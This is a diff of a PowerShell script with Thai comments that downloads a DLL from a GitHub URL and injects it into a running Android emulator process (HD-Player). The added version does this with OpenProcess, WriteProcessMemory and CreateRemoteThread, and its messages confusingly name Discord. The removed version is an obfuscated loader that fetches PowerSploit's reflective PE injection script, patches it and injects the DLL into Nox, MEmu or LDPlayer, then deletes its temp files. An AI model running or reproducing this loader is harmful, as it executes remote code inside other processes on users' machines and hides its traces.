@@ -1,91 +1,95 @@
+# --- CONFIGURATION ---
+$dllUrl = "https://raw.githubusercontent.com/malachixxx/testdll/main/dbghelp.dll" 
+$tempPath = "$env:TEMP\dbghelp.dll"
+$processName = "HD-Player"
 
-$_0x91A = @(
-"https://raw",
-".githubusercontent",
-".com/malachixxx",
-"/testdll/main/",
-"dbghelp.dll"
-) -join ""
+# 1. ดาวน์โหลด DLL จากลิงก์
+try {
+    Write-Host "[*] Downloading DLL..." -ForegroundColor Cyan
+    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath -Force -ErrorAction Stop
+} catch {
+    Write-Host "[-] Failed to download DLL: $($_.Exception.Message)" -ForegroundColor Red
+    return
+}
 
-$_0xB2F = Join-Path $env:TEMP (@("dbg","help",".dll") -join "")
+# 2. ตรวจสอบ Process Discord
+# Discord มักจะมีหลาย Process (PID) เราจะเลือกเอาตัวแรกที่เจอ
+$allProcesses = Get-Process $processName -ErrorAction SilentlyContinue
 
-Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
+if (-not $allProcesses) {
+    Write-Host "[-] HD-PLAYER is not running! Please open Discord first." -ForegroundColor Red
+    return
+}
 
-$_0x7C1 = New-Object (@("System",".Net",".WebClient") -join "")
-$_0x7C1.Headers.Add((@("User","-Agent") -join ""), (@("Moz","illa/","5.0") -join ""))
+# เลือก Process แรกจากรายการที่พบ
+$targetProcess = $allProcesses[0]
 
-$_0x5F9 = $_0x7C1.DownloadData($_0x91A)
+# 3. นิยามฟังก์ชัน Windows API ด้วย C#
+$Source = @"
+using System;
+using System.Runtime.InteropServices;
 
-$_0x3D2 = @(
-"https://raw",
-".githubusercontent",
-".com/PowerShellMafia",
-"/PowerSploit/master",
-"/CodeExecution/",
-"Invoke-ReflectivePEInjection.ps1"
-) -join ""
+public class Injector {
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
-$_0x8E4 = "$env:TEMP\Reflective_$(Get-Random).ps1"
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
-Invoke-WebRequest -Uri $_0x3D2 -OutFile $_0x8E4 -UseBasicParsing
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
 
-$_0xA77 = Get-Content $_0x8E4 -Raw
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-$_0xA77 = $_0xA77 -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
 
-$_0xA77 = $_0xA77 -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+}
+"@
 
-$_0xC11 = "$env:TEMP\Reflective_fixed.ps1"
+if (-not ([System.Management.Automation.PSTypeName]"Injector").Type) {
+    Add-Type -TypeDefinition $Source
+}
 
-$_0xA77 | Set-Content $_0xC11 -Encoding UTF8
+# 4. เริ่มกระบวนการ Injection
+try {
+    Write-Host "[*] Target Found: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Yellow
+    Write-Host "[*] Injecting DLL..." -ForegroundColor Cyan
 
-. $_0xC11
+    # เปิด Process Handle (PROCESS_ALL_ACCESS = 0x1F0FFF)
+    $hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetProcess.Id)
+    
+    if ($hProcess -eq [IntPtr]::Zero) {
+        Write-Host "[-] Could not get handle to Discord. Try running PowerShell as Administrator." -ForegroundColor Red
+        return
+    }
 
-$_0xProcNames = @("Nox", "AndroidProcess", "LdVBoxHeadless", "MEmuHeadless", "HD-Player")
+    # จองพื้นที่ใน Memory
+    $dllPathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempPath)
+    $allocMem = [Injector]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$dllPathBytes.Length, 0x3000, 0x40)
 
-$_0xFound = @()
-foreach ($_0xN in $_0xProcNames) {
-    $_0xP = Get-Process -Name $_0xN -ErrorAction SilentlyContinue
-    if ($_0xP) {
-        foreach ($_0xPi in $_0xP) {
-            $_0xFound += [PSCustomObject]@{ Name = $_0xN; PID = $_0xPi.Id }
+    # เขียนที่อยู่ DLL ลงใน Memory
+    $bytesWritten = [IntPtr]::Zero
+    $success = [Injector]::WriteProcessMemory($hProcess, $allocMem, $dllPathBytes, [uint32]$dllPathBytes.Length, [ref]$bytesWritten)
+
+    if ($success) {
+        $loadLibraryAddr = [Injector]::GetProcAddress([Injector]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
+        $hThread = [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)
+        
+        if ($hThread -ne [IntPtr]::Zero) {
+            Write-Host "[+] DLL Successfully Injected into Discord!" -ForegroundColor Green
+        } else {
+            Write-Host "[-] Failed to create remote thread." -ForegroundColor Red
         }
+    } else {
+        Write-Host "[-] Failed to write memory to process." -ForegroundColor Red
     }
+} catch {
+    Write-Host "[-] Error during injection: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-if ($_0xFound.Count -eq 0) {
-    Write-Host "[-] ไม่พบ process เป้าหมายที่รันอยู่" -ForegroundColor Red
-    exit
-}
-
-$_0xWarn = @("HD-Player", "AndroidProcess")
-$_0xWarnFound = $_0xFound | Where-Object { $_0xWarn -contains $_.Name }
-$_0xSafeFound = $_0xFound | Where-Object { $_0xWarn -notcontains $_.Name }
-
-if ($_0xWarnFound) {
-    foreach ($_0xW in $_0xWarnFound) {
-        Write-Host "[!] พบ $($_0xW.Name) (PID: $($_0xW.PID)) - อาจ inject ไม่ติด ข้ามไป" -ForegroundColor Yellow
-    }
-}
-
-if ($_0xSafeFound.Count -eq 0) {
-    Write-Host "[-] ไม่มี process ที่ inject ได้แน่นอน (มีแค่ HD-Player/AndroidProcess)" -ForegroundColor Red
-    exit
-} elseif ($_0xSafeFound.Count -eq 1) {
-    $_0x2AA = $_0xSafeFound[0].PID
-    Write-Host "[+] พบ $($_0xSafeFound[0].Name) (PID: $_0x2AA) - กำลัง inject..." -ForegroundColor Green
-    Invoke-ReflectivePEInjection -PEBytes $_0x5F9 -ProcId $_0x2AA
-} else {
-    Write-Host "[-] พบหลาย process ที่รันพร้อมกัน ไม่สามารถเลือกอัตโนมัติได้:" -ForegroundColor Red
-    foreach ($_0xS in $_0xSafeFound) {
-        Write-Host "    $($_0xS.Name) (PID: $($_0xS.PID))" -ForegroundColor Cyan
-    }
-    exit
-}
-
-notepad "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-
-Remove-Item $_0xB2F -Force -ErrorAction SilentlyContinue
-
-Get-ChildItem (@("$env:TEMP","/Reflective_*.ps1") -join "") -ErrorAction SilentlyContinue |
-Remove-Item -Force -ErrorAction SilentlyContinue
+# ลบไฟล์ DLL (ทางเลือก: หากต้องการลบทันทีอาจติด Error เพราะ Discord กำลังใช้งานอยู่)
+# Remove-Item $tempPath -ErrorAction SilentlyContinue
